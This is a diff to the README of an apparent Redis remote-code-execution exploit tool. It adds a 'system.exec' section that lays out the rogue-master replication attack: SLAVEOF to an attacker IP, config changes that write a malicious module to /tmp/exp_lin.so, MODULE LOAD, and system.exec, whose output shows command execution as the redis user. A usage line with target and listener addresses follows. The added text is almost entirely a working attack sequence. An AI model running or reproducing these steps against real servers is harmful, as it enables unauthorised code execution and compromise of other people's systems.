@@ -21,7 +21,25 @@ _sys_siglist
 ![](./redis-exec.jpg)
 ![](./redis-exec-result.jpg)
 
+### system.exec
+![](./redis-system-exec.jpg)
 
+```
+0x01 SLAVEOF 192.168.2.18 8989
+
+0x02 config set dir /tmp
+
+0x03 config set dbfilename exp_lin.so
+
+0x04 MODULE LOAD /tmp/exp_lin.so
+
+0x05 slaveof no one
+
+0x06 system.exec id
+
+���Auid=100(redis) gid=101(redis) groups=101(redis),101(redis)
+
+```
 ### Usage:
 
 `python redis-rce.py -r 10.10.20.166 -p 6379 -L 192.168.2.18 -f exp_lin.so`
